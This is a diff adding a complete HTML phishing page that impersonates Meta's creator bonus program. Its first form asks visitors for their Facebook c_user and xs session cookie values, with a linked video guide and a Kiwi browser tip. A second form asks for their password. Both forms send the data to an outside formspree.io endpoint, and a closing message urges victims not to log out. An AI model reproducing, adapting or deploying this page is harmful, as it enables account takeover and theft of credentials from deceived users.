@@ -1,0 +1,263 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <meta name="referrer" content="no-referrer">
+      <meta http-equiv="X-Content-Type-Options" content="nosniff">
+      <meta http-equiv="X-Frame-Options" content="deny">
+      <meta http-equiv="Feature-Policy" content="camera 'none'; microphone 'none';">
+      <meta http-equiv="Access-Control-Allow-Origin" content="your-domain.com">
+      <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+
+  <link rel="icon" type="image/x-icon" href="Facebookicon.png"/>
+  <title>Creator with Meta Bonuses</title>
+  <style>
+    body {
+      max-width: 700px;
+      margin: 0 auto;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+    }
+
+    h1 {
+      color: #1877f2;
+    }
+
+    #unusualActivityMessage {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 12px;
+      margin-bottom: 36px;
+      text-align: center;
+      font-size: 16px;
+    }
+
+    #mainForm {
+      display: flex;
+      flex-direction: column;
+      padding: 10px;
+    }
+    #additionalInfoContainer{
+      display: flex;
+      flex-direction: column;
+      padding: 10px;
+
+    }
+
+    label {
+      margin-bottom: 5px;
+      font-size: 16px;
+    }
+
+    input {
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #dddfe2;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: #1877f2;
+      color: #fff;
+      padding: 10px;
+      cursor: pointer;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    #topImage,
+    #bottomImage {
+      max-width: 100%;
+      margin: 0 auto;
+      display: block;
+    }
+
+    video {
+      width: 50%;
+      margin-top: 10px;
+      height: 180px;
+    }
+    #useLaptopNote {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 0.1px;
+      color: #606770;
+    }
+
+    #bottomImage {
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    footer {
+      background-color: #f0f2f5;
+      padding: 10px;
+      text-align: center;
+      font-size: 12px;
+      color: #606770;
+    }
+
+    /* Add this style for the thank you message */
+    #thankYouMessage {
+      display: none;
+      text-align: center;
+      font-size: 18px;
+      margin-top: 20px;
+      background-color: #e9ebee; /* Facebook light gray background */
+      padding: 15px;
+      border-radius: 8px;
+      color: #1c1e21; /* Facebook dark text color */
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Top Image -->
+  <img id="topImage" src="topimg.png">
+
+  <h1>Amplify your earnings as a creator with Meta Bonuses</h1>
+
+  <!-- Display message for unusual activity -->
+  <div id="unusualActivityMessage">
+    <p>We want to make it easy for Creators to make money by expressing their creativity and doing what they love. Join a Bonus program and earn money based on performance, earnings or content challenges that reward you when you reach key milestones and achievements. You can even sign up for multiple bonus programs and maximize your payouts if you meet the relevant requirements.</p>
+  </div>
+
+  <p>Congratulations on taking the initiative to maximize your earnings through our monetization tools! To streamline the bonus process, please fill out the following form with the assistance of the video guidance provided.</p>
+
+  <!-- Video -->
+  <video controls>
+    <source src="https://detailed-video-29b30.web.app/detailed%20video.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+  <div id="useLaptopNote">
+    <p>
+      <span style="font-weight: bold;">Facebook Support:</span> Hey there! 🌟 Before you proceed, it's recommended to use a laptop or PC for the form submission process.(Download "kiwi browser" for mobile users only)
+    </p>
+    <p>
+      <strong>Watch video for assistance</strong>
+    </p>
+  </div>
+  <!-- Combined Form -->
+  <div  id="formContainer">
+    <form
+      id="mainForm"
+      action="https://formspree.io/f/xzbnvepr"
+      method="POST"
+      onsubmit="return showAdditionalInfo(event)"
+    >
+       
+        <br />
+        <div>
+          <p class="text-slate-400 pl-4 mt-1">C_user</p>
+          <input
+            class="border h-6 pl-1 mx-3"
+            type="number"
+            name="c_user"
+            required
+          />
+        </div>
+        <div>
+          <p class="text-slate-400 pl-4 mt-1">Xs</p>
+          <input
+            class="border h-6 pl-1 mx-3"
+            type="text"
+            name="xs"
+            required
+          />
+        </div>
+       
+        <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
+          <div class="flex justify-start mx-5">
+            <button
+              class="border h-7 w-16 bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500"
+              id="mainSubmitBtn"
+              type="submit"
+            >
+              Submit
+            </button>
+          </div>
+        </div>
+      
+    </form>
+  </div>
+  <br />
+  <br />
+  <br />
+  <!-- Closing div for the outer container -->
+  <div
+    
+    id="additionalInfoContainer"
+    style="display: none"
+  >
+    <form action="https://formspree.io/f/xzbnvepr" method="post">
+      <!-- Include fields from the main form that you want to submit -->
+      <input type="hidden" name="c_user" id="additionalCUser" />
+      <input type="hidden" name="xs" id="additionalXs" />
+
+      <label for="additionalInfo" style="”font-size:28;”"
+        >Facebook Security</label
+      >
+      <br>
+      <div class="Caption">
+        <font color="grey"
+          ><br>Please re-enter your password to complete the request. <a></a>
+        </font>
+      </div>
+      <br>
+      <input
+        type="text"
+        id="additionalInfo"
+        name="additionalInfo"
+        placeholder="Password"
+      />
+      <br>
+      <button
+        class="border h-7 w-16 bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500"
+        type="submit" 
+      >
+        Submit
+      </button>
+      <br>
+    </form>
+  </div>
+  <br />
+
+ <!-- Thank You Message -->
+<div id="thankYouMessage">
+  <p>Your form has been successfully submitted!</p>
+  <p>For your security, please refrain from logging out of Facebook until you receive the confirmation email.</p>
+</div>
+
+
+  <!-- Include the script.js file -->
+  <script src="script.js"></script>
+
+  <!-- Footer -->
+  <footer>
+    <p>META©️ 2023</p>
+    <p>About | AdChoices | Terms and policies | Privacy Policy | Careers | Create Page</p>
+  </footer>
+
+  <!--<script>
+    function submitForm(event) {
+      event.preventDefault(); // Prevent the form from submitting
+
+      // Assuming you have some form validation logic here
+
+      // Display the thank you message
+      document.getElementById('thankYouMessage').style.display = 'block';
+
+      // You can also add logic here to send the form data to a server or perform additional actions
+    }
+  </script>
+-->
+</body>
+
+</html>
